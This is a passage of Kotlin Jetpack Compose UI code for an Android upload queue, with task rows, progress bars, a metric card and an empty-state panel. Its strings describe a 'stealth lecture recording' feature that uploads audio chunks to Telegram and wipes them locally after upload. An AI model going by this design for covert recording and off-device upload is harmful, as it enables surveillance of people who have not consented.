            WorkInfo.State.CANCELLED -> "Upload cancelled by user"
            WorkInfo.State.BLOCKED -> "Blocked by work dependencies"
        }

    val (stateColor, stateBgColor, stateIcon) = when (workInfo.state) {
        WorkInfo.State.RUNNING -> Triple(CyberCyan, CyberCyan.copy(alpha = 0.12f), Icons.Default.CloudUpload)
        WorkInfo.State.ENQUEUED -> Triple(CyberAmber, CyberAmber.copy(alpha = 0.12f), Icons.Default.Schedule)
        WorkInfo.State.SUCCEEDED -> Triple(CyberGreen, CyberGreen.copy(alpha = 0.12f), Icons.Default.CloudDone)
        WorkInfo.State.FAILED -> Triple(CyberRed, CyberRed.copy(alpha = 0.12f), Icons.Default.CloudOff)
        WorkInfo.State.CANCELLED -> Triple(CyberTextMuted, CyberTextMuted.copy(alpha = 0.12f), Icons.Default.Cancel)
        WorkInfo.State.BLOCKED -> Triple(CyberAmber, CyberAmber.copy(alpha = 0.12f), Icons.Default.HourglassTop)
    }

    val progressFraction = (progressPercent / 100f).coerceIn(0f, 1f)

    Card(
        modifier = modifier
            .fillMaxWidth()
            .testTag("upload_task_row_${workInfo.id}"),
        colors = CardDefaults.cardColors(containerColor = CyberSurface),
        shape = RoundedCornerShape(12.dp),
        border = BorderStroke(1.dp, if (workInfo.state == WorkInfo.State.RUNNING) CyberCyan.copy(alpha = 0.6f) else CyberBorder)
    ) {
        // Core Row-based UI layout
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            // 1. Status Indicator Box with Circular Progress or Icon
            Box(
                modifier = Modifier
                    .size(46.dp)
                    .clip(CircleShape)
                    .background(stateBgColor),
                contentAlignment = Alignment.Center
            ) {
                if (workInfo.state == WorkInfo.State.RUNNING) {
                    CircularProgressIndicator(
                        progress = { progressFraction },
                        modifier = Modifier.size(38.dp),
                        strokeWidth = 3.dp,
                        color = CyberCyan,
                        trackColor = CyberSurfaceVariant
                    )
                    Icon(
                        imageVector = Icons.Default.CloudUpload,
                        contentDescription = "Uploading",
                        tint = CyberCyan,
                        modifier = Modifier.size(18.dp)
                    )
                } else {
                    Icon(
                        imageVector = stateIcon,
                        contentDescription = workInfo.state.name,
                        tint = stateColor,
                        modifier = Modifier.size(22.dp)
                    )
                }
            }

            // 2. Middle Content Column: Title, Progress Bar, Metadata
            Column(
                modifier = Modifier.weight(1f),
                verticalArrangement = Arrangement.spacedBy(5.dp)
            ) {
                // Header Row: Title & Status Badge
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = if (chunkIndex > 0) "$chunkTitle #$chunkIndex" else chunkTitle,
                        fontFamily = FontFamily.Monospace,
                        fontWeight = FontWeight.Bold,
                        fontSize = 13.sp,
                        color = CyberTextPrimary,
                        maxLines = 1,
                        overflow = TextOverflow.Ellipsis,
                        modifier = Modifier.weight(1f, fill = false)
                    )

                    Surface(
                        shape = RoundedCornerShape(4.dp),
                        color = stateBgColor,
                        modifier = Modifier.padding(start = 6.dp)
                    ) {
                        Text(
                            text = workInfo.state.name,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 9.sp,
                            fontWeight = FontWeight.Bold,
                            color = stateColor,
                            modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
                        )
                    }
                }

                // Progress Indicator Row (Bar + Percentage)
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    LinearProgressIndicator(
                        progress = { progressFraction },
                        modifier = Modifier
                            .weight(1f)
                            .height(6.dp)
                            .clip(RoundedCornerShape(3.dp)),
                        color = stateColor,
                        trackColor = CyberSurfaceVariant
                    )
                    Text(
                        text = "$progressPercent%",
                        fontFamily = FontFamily.Monospace,
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        color = stateColor
                    )
                }

                // Status Message and Footprint Detail Row
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = statusMessage,
                        fontFamily = FontFamily.Monospace,
                        fontSize = 9.sp,
                        color = CyberTextSecondary,
                        maxLines = 1,
                        overflow = TextOverflow.Ellipsis,
                        modifier = Modifier.weight(1f, fill = false)
                    )

                    if (totalBytes > 0) {
                        Text(
                            text = "${AudioChunkRecorder.formatBytes(bytesSent)} / ${AudioChunkRecorder.formatBytes(totalBytes)}",
                            fontFamily = FontFamily.Monospace,
                            fontSize = 8.sp,
                            color = CyberTextMuted,
                            modifier = Modifier.padding(start = 4.dp)
                        )
                    } else if (workInfo.runAttemptCount > 0) {
                        Text(
                            text = "Retry #${workInfo.runAttemptCount}",
                            fontFamily = FontFamily.Monospace,
                            fontSize = 8.sp,
                            color = CyberAmber,
                            modifier = Modifier.padding(start = 4.dp)
                        )
                    }
                }
            }

            // 3. Trailing Action Button Row item
            when (workInfo.state) {
                WorkInfo.State.RUNNING, WorkInfo.State.ENQUEUED, WorkInfo.State.BLOCKED -> {
                    IconButton(
                        onClick = onCancel,
                        modifier = Modifier
                            .size(34.dp)
                            .clip(CircleShape)
                            .background(CyberRed.copy(alpha = 0.12f))
                            .testTag("btn_cancel_task_${workInfo.id}")
                    ) {
                        Icon(
                            imageVector = Icons.Default.Cancel,
                            contentDescription = "Cancel task",
                            tint = CyberRed,
                            modifier = Modifier.size(18.dp)
                        )
                    }
                }
                WorkInfo.State.FAILED -> {
                    IconButton(
                        onClick = onRetry,
                        modifier = Modifier
                            .size(34.dp)
                            .clip(CircleShape)
                            .background(CyberAmber.copy(alpha = 0.12f))
                            .testTag("btn_retry_task_${workInfo.id}")
                    ) {
                        Icon(
                            imageVector = Icons.Default.Refresh,
                            contentDescription = "Retry upload",
                            tint = CyberAmber,
                            modifier = Modifier.size(18.dp)
                        )
                    }
                }
                WorkInfo.State.SUCCEEDED -> {
                    Box(
                        modifier = Modifier
                            .size(34.dp)
                            .clip(CircleShape)
                            .background(CyberGreen.copy(alpha = 0.1f)),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(
                            imageVector = Icons.Default.CheckCircle,
                            contentDescription = "Finished",
                            tint = CyberGreen,
                            modifier = Modifier.size(16.dp)
                        )
                    }
                }
                WorkInfo.State.CANCELLED -> {
                    // No action needed for cancelled
                }
            }
        }
    }
}

/**
 * Metric summary card in Row layout.
 */
@Composable
fun MetricCard(
    label: String,
    value: String,
    accentColor: Color,
    icon: ImageVector,
    modifier: Modifier = Modifier
) {
    Column(
        modifier = modifier
            .clip(RoundedCornerShape(8.dp))
            .background(CyberSurface)
            .border(1.dp, CyberBorder, RoundedCornerShape(8.dp))
            .padding(vertical = 10.dp, horizontal = 8.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.spacedBy(4.dp)
    ) {
        Icon(
            imageVector = icon,
            contentDescription = null,
            tint = accentColor,
            modifier = Modifier.size(16.dp)
        )
        Text(
            text = value,
            fontFamily = FontFamily.Monospace,
            fontSize = 13.sp,
            fontWeight = FontWeight.Bold,
            color = CyberTextPrimary,
            maxLines = 1
        )
        Text(
            text = label,
            fontFamily = FontFamily.Monospace,
            fontSize = 8.sp,
            fontWeight = FontWeight.SemiBold,
            color = CyberTextMuted,
            maxLines = 1
        )
    }
}

/**
 * Stylish empty state when no tasks match filter.
 */
@Composable
fun UploadEmptyState(
    filter: UploadFilter,
    onEnqueueTest: () -> Unit,
    modifier: Modifier = Modifier
) {
    Column(
        modifier = modifier
            .fillMaxWidth()
            .clip(RoundedCornerShape(12.dp))
            .background(CyberSurface)
            .border(1.dp, CyberBorder, RoundedCornerShape(12.dp))
            .padding(28.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        Box(
            modifier = Modifier
                .size(64.dp)
                .clip(CircleShape)
                .background(CyberCyan.copy(alpha = 0.1f)),
            contentAlignment = Alignment.Center
        ) {
            Icon(
                imageVector = Icons.Default.CloudUpload,
                contentDescription = null,
                tint = CyberCyan,
                modifier = Modifier.size(32.dp)
            )
        }

        Text(
            text = "NO ${filter.label.uppercase()} TASKS",
            fontFamily = FontFamily.Monospace,
            fontWeight = FontWeight.Bold,
            fontSize = 14.sp,
            color = CyberTextPrimary
        )

        Text(
            text = when (filter) {
                UploadFilter.ALL -> "WorkManager queue is currently empty. Start a stealth lecture recording or enqueue a test task below."
                UploadFilter.ACTIVE -> "No audio uploads currently transmitting. In-flight chunks will appear here with live progress."
                UploadFilter.ENQUEUED -> "No uploads waiting in queue. WorkManager automatically schedules chunks on network connect."
                UploadFilter.COMPLETED -> "No finished tasks in history yet. Uploaded chunks wipe from local disk immediately upon Telegram HTTP 200."
                UploadFilter.FAILED -> "All uploads are healthy. Failed attempts retry automatically with exponential backoff."
            },
            fontFamily = FontFamily.Monospace,
            fontSize = 11.sp,
            color = CyberTextSecondary,
            modifier = Modifier.padding(horizontal = 8.dp)
        )

        Spacer(modifier = Modifier.height(6.dp))

        Button(
            onClick = onEnqueueTest,
            colors = ButtonDefaults.buttonColors(containerColor = CyberCyan),
            shape = RoundedCornerShape(8.dp),
            modifier = Modifier.testTag("btn_empty_state_enqueue")
        ) {
            Icon(
                imageVector = Icons.Default.PlayArrow,
                contentDescription = null,
                tint = CyberBg,
                modifier = Modifier.size(16.dp)
            )
            Spacer(modifier = Modifier.width(6.dp))
            Text(
                text = "Dispatch Test WorkManager Task",
                fontFamily = FontFamily.Monospace,
                fontWeight = FontWeight.Bold,
                fontSize = 11.sp,
                color = CyberBg
            )
        }
    }
}
